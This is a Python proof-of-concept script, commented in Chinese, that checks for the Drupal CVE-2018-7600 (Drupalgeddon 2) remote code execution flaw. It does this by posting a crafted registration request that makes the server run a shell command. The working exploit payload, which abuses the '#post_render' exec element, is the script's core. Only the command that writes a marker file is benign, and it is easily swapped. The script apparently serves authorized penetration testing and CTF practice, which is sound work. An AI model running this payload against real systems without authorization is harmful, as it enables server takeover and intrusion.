#!/usr/bin/env python3
# coding:utf-8

"""
drupal CVE-2018-7600 POC 检测脚本

漏洞描述:
drupal Core 的用户注册表单存在远程代码执行漏洞(drupalgeddon 2)。
攻击者可以通过构造恶意的注册请求来执行任意 PHP 代码。

影响版本:
- drupal 6.x, 7.x, 8.x, 9.x

检测原理:
通过向 /user/register 端点发送包含恶意 PHP 代码的注册请求,
尝试创建一个包含测试内容的文件。如果能够成功访问该文件,
则说明存在漏洞。

使用方法:
    python cve_2018_7600_poc.py
    或在代码中调用 poc(url) 函数

参数说明:
    url: 目标URL,如 http://node3.buuoj.cn:26848/
    timeout: 请求超时时间(秒),默认10秒

返回值:
    (True, '存在漏洞') - 检测到漏洞
    (False, '安全') - 未检测到漏洞
    (False, '扫描失败 - 错误信息') - 扫描过程中出现错误

注意:
    此POC仅用于安全测试和授权的渗透测试,请勿用于非法用途。
"""


import requests

def poc(url, timeout=10):


    try:
        target = url
        commands = 'echo "test:)" | tee index1.txt'   # index1.txt文件
        url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': '{}'.format(commands)}
        requests.post(url=url, data=payload, timeout=timeout)
        index1_url = target + '/index1.txt'
        res = requests.get(url=index1_url, timeout=timeout)
        if 'test:)' in res.text and res.status_code == 200:
            print('[+] [{}] 存在drupal geddon 2 远程代码执行漏洞(CVE-2018-7600)'.format(target))
            return True, 'drupal CVE-2018-7600: 存在漏洞'
        else:
            print('[-] [{}] 不存在drupal geddon 2 远程代码执行漏洞(CVE-2018-7600)'.format(target))
            return False, 'drupal CVE-2018-7600: 安全'
    except Exception as e:
        return False, f'drupal CVE-2018-7600: 扫描失败 - {str(e)}'

